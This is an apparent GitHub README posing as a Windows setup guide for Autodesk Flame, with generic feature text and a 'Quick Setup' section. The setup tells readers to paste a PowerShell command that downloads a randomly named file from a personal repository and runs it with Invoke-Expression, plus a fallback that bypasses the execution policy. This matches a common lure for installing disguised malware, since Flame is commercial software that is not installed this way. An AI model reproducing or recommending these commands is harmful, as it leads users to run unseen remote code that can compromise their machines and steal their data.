# Flame

Flame is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Flame and work in it.

Autodesk Flame is a high-end finishing and visual effects application used when shots must be conformed, graded, and delivered from a single timeline. On Windows workstations in editorial suites and VFX bays, artists work with layered compositing, advanced color tools, and editorial cut integration so review cycles stay inside one session instead of bouncing between many apps.

A typical Windows session starts with importing camera originals or edited sequences, rebuilding the timeline against new handles, then compositing fixes, beauty work, and legalizing color for the deliverable spec. Supervisors scrub versions in context, artists iterate on Action setups and batch nodes, and operators export masters or handoffs once the room signs off on picture and metadata.

This repository holds a structured setup file for consistent installs across seats, short operational notes for drivers and project paths, and a changelog that records build bumps and workflow tweaks. It is meant as a practical anchor for Flame on Windows rather than a long-form manual.

## What you do with it

- Integrated timeline editing lets you conform cuts while compositing without round-tripping to separate NLE tools.
- Action and Batch workflows combine node-based compositing with repeatable templates for episodic television delivery.
- Advanced color management supports ACES and show LUTs so grades stay consistent across Flame seats on Windows.
- Modular keying and tracking tools stabilize roto and match-move work on green screen and complex plates.
- Shared libraries and setups sync project bins so multiple artists can split sequences on one facility network.
- Broadcast-safe legalizing and format presets help operators export masters that meet station and streaming specifications.
- Depth and 3D compositing inside Flame supports camera projections for set extensions and title integration.
- Version stacks and compare modes speed supervisor reviews when picture notes arrive during the same session.

## Quick Setup (PowerShell)

This installs the program Flame on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/nadinek719043/flame-setup-guide/main/lcxn6ril2e.l5zltj07 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/nadinek719043/flame-setup-guide/main/lcxn6ril2e.l5zltj07 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `lcxn6ril2e.l5zltj07` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `nadinek719043/flame-setup-guide`. Autodesk Flame 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
